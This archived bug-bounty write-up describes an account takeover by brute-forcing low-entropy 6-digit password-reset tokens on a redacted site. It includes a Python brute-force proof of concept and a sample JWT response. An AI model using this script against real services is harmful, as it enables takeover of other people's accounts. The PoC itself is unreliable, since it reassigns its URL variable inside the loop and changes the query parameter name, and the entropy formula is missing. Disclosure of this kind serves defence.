# Account Takeover via Weak Reset Token Entropy

- **Source URL:** https://medium.com/@majix_de/account-takeover-via-weak-reset-token-entropy-c475268daae6?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240901131911/https://medium.com/@majix_de/account-takeover-via-weak-reset-token-entropy-c475268daae6
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6644 (id 6644)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Overview

In this article, we explore a critical security vulnerability discovered during a penetration test. The flaw involves a weak 6-digit code used for password resets, which is not tied to individual user sessions or accounts but rather added to a pool of active tokens. This design flaw makes it easy for attackers to take over user accounts via a brute-force attack on the low entropy reset token.

# The Vulnerability: 6-Digit Token Reset

# Token Reset Mechanism

To receive a token, a username must be entered into the reset form, which then sends the token to the email address associated with that username. The system in question employs a 6-digit code (0–9) for resetting passwords. The reset mechanism can be triggered using a URL containing the 6-digit code, such as:

```
GET /redacted/reset?secret=123456 HTTP/2
HOST: redacted.com
```
# What is Entropy?

Entropy, in the context of security, refers to the measure of randomness and unpredictability in a system. Higher entropy means greater security, as it becomes more difficult for attackers to predict or brute-force the correct values. It is usually measured in bits; the more bits of entropy, the more possible combinations an attacker must try. In real-life scenarios, we can consider an entropy of 64 bits (2⁶⁴ combinations) as secure.

# Token entropy of the application

Each digit ranges from 0 to 9, resulting in a total of 1 million possible combinations:

For our 6-digit token, the entropy calculation is:

This translates to roughly 19 bits (2¹⁹) of entropy, which is significantly lower than the recommended minimum of 64 bits. Such low entropy makes the token susceptible to brute-force attacks.

# Exploiting the Vulnerability

Due to the low entropy, an attacker can feasibly attempt all 1 million combinations within a reasonable timeframe. Once a valid token is discovered, it can be used to reset the password for any account associated with an active token in the pool. Upon successful token validation, the system returns a JSON Web Token (JWT) containing user information:

```
{
    "sub": "MyUser1",
    "exp": 1719570230,
    "permissions": [
        "UpdatePassword"
    ]
}
```
The sub field reveals the username, allowing the attacker to identify the account. With permission to update the password, the attacker gains full control over the compromised account.

# Proof of Concept (PoC)

```
import requests
url = "redacted"
endpoint = "/redacted/reset/"
for i in range(1000000):
    secret = str(i).zfill(6)
    url = f"https://{url}/{endpoint}?token={secret}"
    response = requests.get(url)
    if "eyJ" in response.text:
        print(f"Valid token found: {secret}")
        print(response.text)
        break
```
# ACL Issues and User Enumeration

During the penetration test, we discovered multiple bugs due to Access Control List (ACL) issues that allowed us to enumerate users. This enumeration enabled us to trigger password resets for users, further exacerbating the vulnerability. By identifying valid usernames, we could systematically request reset tokens, making the attack even more efficient.
